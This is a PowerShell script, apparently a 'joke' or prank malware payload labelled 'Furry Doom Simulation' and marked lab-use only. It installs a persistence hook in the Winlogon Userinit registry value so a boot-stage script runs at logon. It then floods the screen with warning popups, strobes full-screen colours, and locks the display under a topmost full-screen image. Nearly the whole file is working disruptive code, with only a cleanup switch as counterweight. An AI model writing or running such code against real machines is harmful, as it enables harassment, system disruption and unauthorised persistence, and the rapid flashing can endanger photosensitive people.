# ===== Furry Doom Simulation - Main =====
# LAB USE ONLY. Run inside an isolated VM with a snapshot.
param([switch]$Install, [switch]$Cleanup)

Add-Type -AssemblyName System.Windows.Forms, System.Drawing
. (Join-Path $PSScriptRoot 'Config.ps1')

$Root     = 'C:\FurryTest'
$Stage    = Join-Path $Root 'BootStage.ps1'
$HookKey  = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'

# ---------- Cleanup ----------
if ($Cleanup) {
    $ui = (Get-ItemProperty $HookKey -Name Userinit).Userinit
    $clean = ($ui -split ',') | Where-Object { $_ -notmatch 'BootStage' } -join ','
    Set-ItemProperty $HookKey -Name Userinit -Value $clean
    Write-Host "Boot hook removed. Userinit = $clean"
    return
}

# ---------- Install boot hook ----------
if ($Install) {
    $ui = (Get-ItemProperty $HookKey -Name Userinit).Userinit
    if ($ui -notmatch 'BootStage') {
        Set-ItemProperty $HookKey -Name Userinit -Value "$ui,C:\FurryTest\BootStage.ps1"
    }
    Write-Host "Pre-logon hook installed."
}

# ---------- Stage 1: popup storm ----------
for ($i = 0; $i -lt $Global:PopupCount; $i++) {
    $msg  = $Global:PopupMessages[$i % $Global:PopupMessages.Count]
    $icon = if ($i % 3 -eq 0) { 'Error' } elseif ($i % 3 -eq 1) { 'Warning' } else { 'None' }
    $job  = "Start-Job { [System.Windows.Forms.MessageBox]::Show('$msg','FURRY WARNING [$($i+1)/$($Global:PopupCount)]',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::$icon) }"
    Invoke-Expression $job | Out-Null
    Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 400)
}
Get-Job | Wait-Job -Timeout 600 | Remove-Job -Force

# ---------- Stage 2: screen flash ----------
$flash = New-Object Windows.Forms.Form
$flash.FormBorderStyle = 'None'; $flash.WindowState = 'Maximized'
$flash.TopMost = $true; $flash.StartPosition = 'Manual'
$flash.Bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$flash.Show()
$end = (Get-Date).AddSeconds($Global:FlashSeconds)
$c = 0
while ((Get-Date) -lt $end) {
    $flash.BackColor = [Drawing.Color]::FromName($Global:FlashColors[$c % $Global:FlashColors.Count]); $c++
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 120
}
$flash.Close()

# ---------- Stage 3: fullscreen image/animation ----------
$fs = New-Object Windows.Forms.Form
$fs.FormBorderStyle = 'None'; $fs.WindowState = 'Maximized'
$fs.TopMost = $true; $fs.StartPosition = 'Manual'
$fs.Bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen

$pb = New-Object Windows.Forms.PictureBox
$pb.Dock = 'Fill'; $pb.SizeMode = 'Zoom'
if (Test-Path $Global:FullscreenImage) { $pb.Image = [Drawing.Image]::FromFile($Global:FullscreenImage) }
$fs.Controls.Add($pb)
$fs.Show()

[System.Windows.Forms.Application]::Run($fs)   # runs until user closes via Task Manager / Alt+F4

# ---------- Stage 4: boot stage is installed, reboot shows it ----------
if (-not $Install) {
    Write-Host "Run with -Install to enable the pre-logon boot stage."
}